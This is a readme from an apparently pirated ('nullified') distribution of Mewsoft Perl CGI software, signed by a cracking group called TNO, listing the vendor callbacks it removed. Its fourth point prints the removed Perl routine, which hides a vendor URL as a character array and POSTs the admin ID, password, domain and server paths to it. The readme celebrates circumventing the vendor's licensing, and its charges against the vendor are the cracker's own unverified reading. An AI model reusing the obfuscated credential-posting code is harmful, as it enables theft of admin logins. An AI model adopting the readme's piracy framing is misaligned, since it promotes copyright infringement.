This software used 4 very basic callback features which have course been removed.

1. The first thing altered was all the links to http://www.mewsoft.com. All these
   links have now been prefixed with https://www.safeweb.com/o/_i: which means you
   can safely click through to the vendors website without risking your ip/domain
   showing up in any of their refer logs.

2. Secondly 3 of the scripts were calling on a total of 4 images from the vendors
   website. Now rather then have the images called through safeweb I have directed
   them to be called from your local image directory instead. There is no need for
   you to obtain these offending images as they have already been downloaded and
   are packaged with this nullified distribution.

3. Thirdly, when clicking "upgrade" in your Admistration Control Panel the following
   information was sent to mewsoft and pre-entered into their upgrade form:

   a) Your FTP Domain Name/IP
   b) The Absolute Path To Your CGI Directory
   c) The URL To Your CGI Directory
   d) The Absolute Path To Your HTML Directory
   e) The URL To Your HTML Directory
   f) Your Server Path To Perl
   g) The Software To Install
   h) The Installation Type

   All this information with the exceptions of f, g and h (which are harmless) have now
   been changed to "Data Submission Blocked By: TNO". This is to ensure that mewsoft 
   know nothing of your configurations if you ever decide to go to their upgrade site.

4. Finally, and the scariest of them all the following code has been removed:

   sub s{my($p,$o,$u);my(@h)=('h','t','t','p',':','/','/','w','w','w','.','m','e','w','s','o','f','t','.','c','o','m','/','c','g','i','-','b','i','n','/','u','p','g','r','a','d','e','/','u','s','e','r','s','.','c','g','i');$u=join("", @h);$p=qq!action=User_xi&ID=$Global{'Admin_UserID'}&Pass=$Global{'Admin_Password'}&Domain=$Domain&ProgName=$Global{'MainProg_Name'}&AdminName=$Global{'AdminProg_Name'}&URL= $Script_URL&BaseDir=$Global{'BaseDir'}&CGI_URL=$Global{'CGI_URL'}&HtmlDir=$Global{'HtmlDir'}&HTML_URL=$Global{'HTML_URL'}!;$p=~ s/ /%20/g;eval "use http_lib";($s,$t,$r,$z)=&HTTP_Post($u,$p,"POST");}

   In perl the characters '.' are not counted to be of any significant value so the top
   part of this code in (-) is actually "http://www.mewsoft.com/cgi-bin/upgrade/users.cgi"
   The bottom part of this code is the information being recorded by mewsoft and can be
   translated as follows:

   a) Your Admistration User ID
   b) Your Administration Password
   c) Your Domain Name
   d) The Main Program Name
   e) The Administrators Name
   f) The Administrators Program Name
   g) The URL To Your Administration Script
   h) Absoloute Path To Your CGI Directory
   i) The URL Of Your CGI Directory
   j) Absolute Path To Your HTML Directory
   k) The URL To Your HTML Directory
 
   This information is not just recorded on installation it is recorded every single time
   you login to your administration panel. Which means no matter how many times you change
   your username and password mewsoft will know it and will be able to access your admin
   panel anytime they like and for those who have used this software they will know that it
   is capable of storing customers personal details and debit/credit card information!

   This to me is a complete breach of privacy and in most countries against the law. It is
   a scary thought to think that out of mewsoft's thousands of genuine and paying clients
   they have global access to every single one of their installations. A scary thought !!!



  You on the other hand have no worries because if you are reading this then you have in
  your possesion a 100% fully nullified version that mewsoft will never know about #:)


  Enjoy, TNO
